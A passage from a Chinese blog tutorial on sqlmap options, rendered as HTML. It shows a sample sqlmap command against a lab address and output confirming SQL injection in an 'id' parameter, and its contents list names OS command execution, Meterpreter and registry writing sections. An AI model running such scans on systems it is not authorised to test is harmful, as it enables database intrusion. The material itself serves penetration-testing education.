class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u</span><br><span class="line"><span class="string">"http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1"</span> --batch</span><br><span class="line">--smart</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="keyword">if</span> GET parameter <span class="string">'ca'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] GET parameter <span class="string">'ca'</span> does <span class="keyword">not</span> appear dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] heuristic (basic) test shows that GET parameter <span class="string">'ca'</span> might</span><br><span class="line"><span class="keyword">not</span> be injectable</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] skipping GET parameter <span class="string">'ca'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="keyword">if</span> GET parameter <span class="string">'user'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] GET parameter <span class="string">'user'</span> does <span class="keyword">not</span> appear dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] heuristic (basic) test shows that GET parameter <span class="string">'user'</span></span><br><span class="line">might <span class="keyword">not</span> be injectable</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] skipping GET parameter <span class="string">'user'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="keyword">if</span> GET parameter <span class="string">'id'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] confirming that GET parameter <span class="string">'id'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> dynamic</span><br><span class="line">[xx:xx:<span class="number">14</span>] [WARNING] reflective value(s) found <span class="keyword">and</span> filtering out</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] heuristic (basic) test shows that GET parameter <span class="string">'id'</span> might be</span><br><span class="line">injectable (possible DBMS: <span class="string">'MySQL'</span>)</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="keyword">for</span> SQL injection on GET parameter <span class="string">'id'</span></span><br><span class="line">heuristic (parsing) test showed that the back-end DBMS could be <span class="string">'MySQL'</span>. Do you</span><br><span class="line">want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">do you want to include all tests <span class="keyword">for</span> <span class="string">'MySQL'</span> extending provided level (<span class="number">1</span>) <span class="keyword">and</span></span><br><span class="line">risk (1)? [Y/n] Y</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'AND boolean-based blind - WHERE or HAVING clause'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'AND boolean-based blind - WHERE or</span></span><br><span class="line"><span class="string">HAVING clause'</span> injectable</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL \&gt;= 5.0 AND error-based - WHERE or HAVING</span></span><br><span class="line"><span class="string">clause'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'MySQL \&gt;= 5.0 AND error-based - WHERE</span></span><br><span class="line"><span class="string">or HAVING clause'</span> injectable</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL inline queries'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL \&gt; 5.0.11 stacked queries'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL \&lt; 5.0.12 stacked queries (heavy query)'</span></span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] testing <span class="string">'MySQL \&gt; 5.0.11 AND time-based blind'</span></span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'MySQL \&gt; 5.0.11 AND time-based blind'</span></span><br><span class="line">injectable</span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] testing <span class="string">'MySQL UNION query (NULL) - 1 to 20 columns'</span></span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] automatically extending ranges <span class="keyword">for</span> UNION query injection</span><br><span class="line">technique tests <span class="keyword">as</span> there <span class="keyword">is</span> at least one other potential injection technique</span><br><span class="line">found</span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] ORDER BY technique seems to be usable. This should reduce the</span><br><span class="line">time needed to find the right number of query columns. Automatically extending</span><br><span class="line">the range <span class="keyword">for</span> current UNION query injection technique test</span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] target URL appears to have <span class="number">3</span> columns <span class="keyword">in</span> query</span><br><span class="line">[xx:xx:<span class="number">24</span>] [INFO] GET parameter <span class="string">'id'</span> <span class="keyword">is</span> <span class="string">'MySQL UNION query (NULL) - 1 to 20</span></span><br><span class="line"><span class="string">columns'</span> injectable</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h4 id="初级用户向导参数"><a href="#初级用户向导参数" class="headerlink" title="初级用户向导参数"></a>初级用户向导参数</h4><p>参数：<code>--wizard</code>面向初级用户的参数，可以一步一步教你如何输入针对目标注入。</p>
+<p>参考：</p>
+<p><a href="https://xz.aliyun.com/t/3010" target="_blank" rel="noopener">https://xz.aliyun.com/t/3010</a></p>
+<p>sqlmap用户手册中文版：</p>
+<p><a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html" target="_blank" rel="noopener">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html</a></p>
+<p>sqlmap用户手册：</p>
+<p><a href="http://drops.xmd5.com/static/drops/tips-143.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-143.html</a></p>
+<p>sqlmap tamper脚本 ：</p>
+<p><a href="http://www.lengbaikai.net/?p=110" target="_blank" rel="noopener">http://www.lengbaikai.net/?p=110</a></p>
+<p><a href="https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vEEoMacmETUA4yZODY8xMQ</a></p>
+<p><a href="https://xz.aliyun.com/t/2746" target="_blank" rel="noopener">https://xz.aliyun.com/t/2746</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2019/12/08/Sqlmap之使用手册第二部分/" title="Sqlmap之使用手册（下）">https://choge.top/2019/12/08/Sqlmap之使用手册第二部分/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/11/26/Sqlmap之使用手册/" rel="next" title="Sqlmap之使用手册（上）">
+                  <i class="fa fa-chevron-left"></i> Sqlmap之使用手册（上）
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/12/10/sqlmap之进阶使用/" rel="prev" title="Sqlmap之使用进阶">
+                  Sqlmap之使用进阶 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#其他高级"><span class="nav-number">1.</span> <span class="nav-text">其他高级</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#用户自定义函数注入"><span class="nav-number">1.1.</span> <span class="nav-text">用户自定义函数注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#系统文件操作"><span class="nav-number">1.2.</span> <span class="nav-text">系统文件操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#从数据库服务器中读取文件"><span class="nav-number">1.2.1.</span> <span class="nav-text">从数据库服务器中读取文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#把文件上传到数据库服务器中"><span class="nav-number">1.2.2.</span> <span class="nav-text">把文件上传到数据库服务器中</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运行任意操作系统命令"><span class="nav-number">1.2.3.</span> <span class="nav-text">运行任意操作系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Meterpreter配合使用"><span class="nav-number">1.2.4.</span> <span class="nav-text">Meterpreter配合使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对Windows注册表操作"><span class="nav-number">1.3.</span> <span class="nav-text">对Windows注册表操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#读取注册表"><span class="nav-number">1.3.1.</span> <span class="nav-text">读取注册表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入注册表"><span class="nav-number">1.3.2.</span> <span class="nav-text">写入注册表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#删除注册表值"><span class="nav-number">1.3.3.</span> <span class="nav-text">删除注册表值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注册表辅助选项"><span class="nav-number">1.3.4.</span> <span class="nav-text">注册表辅助选项</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常规参数"><span class="nav-number">1.4.</span> <span class="nav-text">常规参数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#从sqlite中读取session"><span class="nav-number">1.4.1.</span> <span class="nav-text">从sqlite中读取session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#保存HTTP-S-日志"><span class="nav-number">1.4.2.</span> <span class="nav-text">保存HTTP(S)日志</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#非交互模式"><span class="nav-number">1.4.3.</span> <span class="nav-text">非交互模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#强制使用字符编码"><span class="nav-number">1.4.4.</span> <span class="nav-text">强制使用字符编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爬行网站URL"><span class="nav-number">1.4.5.</span> <span class="nav-text">爬行网站URL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#规定输出到CSV中的分隔符"><span class="nav-number">1.4.6.</span> <span class="nav-text">规定输出到CSV中的分隔符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DBMS身份验证"><span class="nav-number">1.4.7.</span> <span class="nav-text">DBMS身份验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#定义dump数据的格式"><span class="nav-number">1.4.8.</span> <span class="nav-text">定义dump数据的格式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#预估完成时间"><span class="nav-number">1.4.9.</span> <span class="nav-text">预估完成时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#刷新session文件"><span class="nav-number">1.4.10.</span> <span class="nav-text">刷新session文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自动获取form表单测试"><span class="nav-number">1.4.11.</span> <span class="nav-text">自动获取form表单测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自定义输出路径"><span class="nav-number">1.4.12.</span> <span class="nav-text">自定义输出路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#从响应中获取DBMS的错误信息"><span class="nav-number">1.4.13.</span> <span class="nav-text">从响应中获取DBMS的错误信息</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他的一些参数"><span class="nav-number">1.5.</span> <span class="nav-text">其他的一些参数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用参数缩写"><span class="nav-number">1.5.1.</span> <span class="nav-text">使用参数缩写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#成功sql注入时警告"><span class="nav-number">1.5.2.</span> <span class="nav-text">成功sql注入时警告</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#设定会发的答案"><span class="nav-number">1.5.3.</span> <span class="nav-text">设定会发的答案</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#发现sql注入时发出蜂鸣声"><span class="nav-number">1.5.4.</span> <span class="nav-text">发现sql注入时发出蜂鸣声</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#启发式检测WAF-IPS-IDS保护"><span class="nav-number">1.5.5.</span> <span class="nav-text">启发式检测WAF/IPS/IDS保护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#清理sqlmap的UDF-s-和表"><span class="nav-number">1.5.6.</span> <span class="nav-text">清理sqlmap的UDF(s)和表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#禁用色彩输出"><span class="nav-number">1.5.7.</span> <span class="nav-text">禁用色彩输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用指定的Google结果页面"><span class="nav-number">1.5.8.</span> <span class="nav-text">使用指定的Google结果页面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用HTTP参数污染"><span class="nav-number">1.5.9.</span> <span class="nav-text">使用HTTP参数污染</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试WAF-IPS-IDS保护"><span class="nav-number">1.5.10.</span> <span class="nav-text">测试WAF/IPS/IDS保护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模仿智能手机"><span class="nav-number">1.5.11.</span> <span class="nav-text">模仿智能手机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#安全的删除output目录的文件"><span class="nav-number">1.5.12.</span> <span class="nav-text">安全的删除output目录的文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#启发式判断注入"><span class="nav-number">1.5.13.</span> <span class="nav-text">启发式判断注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#初级用户向导参数"><span class="nav-number">1.5.14.</span> <span class="nav-text">初级用户向导参数</span></a></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
